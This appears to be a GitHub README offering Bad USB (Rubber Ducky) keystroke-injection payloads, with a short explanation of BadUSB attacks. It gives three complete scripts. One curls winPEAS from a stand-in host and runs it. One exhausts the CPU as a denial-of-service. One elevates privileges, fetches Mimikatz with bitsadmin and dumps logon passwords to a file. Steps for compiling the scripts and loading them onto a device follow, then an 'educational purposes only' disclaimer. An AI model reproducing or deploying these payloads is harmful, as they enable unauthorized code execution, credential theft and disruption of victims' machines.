Whether you're interested in testing security measures, learning about USB-based attacks, or conducting ethical hacking experiments, this repository offers a curated selection of payloads to meet your needs. 📒 Table of Contents 📒 Table of Contents 📍 Overview ⚙️ Features 👾 List of Bad USB scripts 1️⃣ winPEAS payload delivered by curl 2️⃣ DoS - processor exhaustion 3️⃣ Mimikatz payload delivered by BITSAdmin 🚀 Getting Started ✔️ Prerequisites 💻 Installation 🎮 Generating payloads ⚠️ Warning 🤝 Contributing 📄 License 👏 Acknowledgments 📍 Overview Payload represents the core and often malicious component of code or an attack that is responsible for executing specific actions on a target system. These actions can range from gaining unauthorized access, extracting sensitive data, to compromising the integrity of the targeted software or hardware. Payloads are typically designed to exploit vulnerabilities and are delivered via various means, including email attachments, compromised files, or even physical devices such as USB drives. BadUSB is a computer security attack using USB devices that are programmed with malicious software.For example, USB flash drives can contain a programmable Intel 8051 microcontroller, which can be reprogrammed, turning a USB flash drive into a malicious device. This attack works by programming the fake USB flash drive to emulate a keyboard, which once plugged into a computer, is automatically recognized and allowed to interact with the computer, and can then initiate a series of keystrokes which open a command window and issue commands to download malware. 👾 List of Bad USB scripts 1️⃣ winPEAS payload delivered by curl This script performs the delivery and execution of a potentially malicious file (winPEAS.exe) from a remote location. Its intent, is to open a Command Line on a target Windows system and then fetch via curl and run a payload from a specified URL. REM Title: Bad USB - winPEAS payload delivered by curl REM Author: DannnyzZ REM Date: 10.15.2023 REM Description: Opens commandline, then curls payload from github repository REM Target: Windows 10/11 (cmd) REM Version: 1.0 REM Pause for everything to recognize and be ready DELAY 2000 REM Open Command Line CTRL ESC DELAY 750 STRING cmd DELAY 250 ENTER DELAY 1000 ENTER REM Execute curl payload from link @echo off REM Input command STRING @echo off && set " downloadURL=https://www.malicious.com/winPEAS.exe " && set " downloadPath=%USERPROFILE%\winPEAS.exe " && set " runCommand=%USERPROFILE%\winPEAS.exe " ENTER DELAY 750 STRING curl -LJO " %downloadURL% " && move " winPEAS.exe " " %downloadPath% " && start " " " %runCommand% " ENTER 2️⃣ DoS - processor exhaustion The technical intent of this script is to cause a denial of service (DoS) condition by exhausting the target system's CPU, making it unresponsive and potentially leading to system instability. This type of attack is disruptive and can cause significant disruption to the target system's operation. REM Title: Bad USB - DoS - processor exhaustion REM Author: DannnyzZ REM Date: 10.15.2023 REM Description: Opens commandline, then executes PC stress test. REM Target: Windows 10/11 (cmd) REM Version: 1.0 REM Pause for everything to recognize and be ready DELAY 2000 REM Open Command Line CTRL ESC DELAY 750 STRING cmd DELAY 250 ENTER DELAY 1000 ENTER REM Input command STRING for /l %i in (1,1,1000000) do echo. 2^32 | find /r " .* " ENTER 3️⃣ Mimikatz payload delivered by BITSAdmin This script is a malicious payload designed to harvest login credentials from the target system using Mimikatz. The script delivers Mimikatz via BITSAdmin and then runs it to capture login passwords and save them to a file. REM Title: Bad USB - Mimikatz payload delivered by BITSAdmin REM Author: DannnyzZ REM Date: 10.15.2023 REM Description: MIMIKATZ drop credentials on desktop REM Target: Windows 10/11 (cmd) REM Version: 1.0 REM Pause for everything to recognize and be ready DELAY 2000 REM Elevate priviledges DELAY 750 GUI r DELAY 1000 STRING powershell Start-Process cmd -Verb runAs ENTER DELAY 750 ALT t DELAY 750 ENTER DELAY 500 STRING bitsadmin /transfer " mimikatz " /download /priority foreground " https://www.malicious.com/mimikatz.exe " " C:\Users\Public\mimikatz.exe " ENTER DELAY 3000 REM Execute commands in mimikatz STRING start C: \U sers \P ublic \m imikatz.exe ENTER DELAY 500 STRING privilege::debug ENTER DELAY 1000 STRING sekurlsa::logonpasswords >> C: \U sers \P ublic \d ump.txt ENTER DELAY 1000 🚀 Getting Started ✔️ Prerequisites Before you begin, ensure that you have the following: 1. USB Rubber Ducky, Malduino, any other Bad USB device 2. SD Card adapter 3. Internet connection 🎮 Generating payloads Choose payload in .txt extension, and copy its contents Go to the site below and paste it there: https://payloadstudio.hak5.org/community/ Generate payload out of text (it will be in .bin extension) Store finished payload on any Bad USB of your choice. ⚠️ Disclaimer The owner of this GitHub repository takes no responsibility for the use of the payloads provided. It is essential to understand that the owner disclaims any liability for their use, and these payloads are intended for educational purposes only. 🤝 Contributing Contributions are always welcome! Please follow these steps: Fork the project repository. This creates a copy of the project on your account that you can modify without affecting the original project. Clone the forked repository to your local machine using a Git client like Git or GitHub Desktop. Create a new branch with a descriptive name (e.g., NEW_FIX ). git checkout -b NEW_FIX Make changes to the project's codebase. Commit your changes to your local branch with a clear commit message that explains the changes you've made. git commit -m ' Applied changes. ' Push your changes to your forked repository on GitHub using the following command git push origin NEW_FIX Create a new pull request to the original project repository. In the pull request, describe the changes you've made and why they're necessary. The project maintainers will review your changes and provide feedback or merge them into the main branch. 📄 License This project is licensed under the ℹ️ MIT License. 👏 Acknowledgments ℹ️ Hak5 PayloadStudio ℹ️ Ducktoolkit ℹ️ ChatGPT 4.0 ℹ️ Mimikatz ℹ️ winPEAS About This repository is dedicated to payloads.
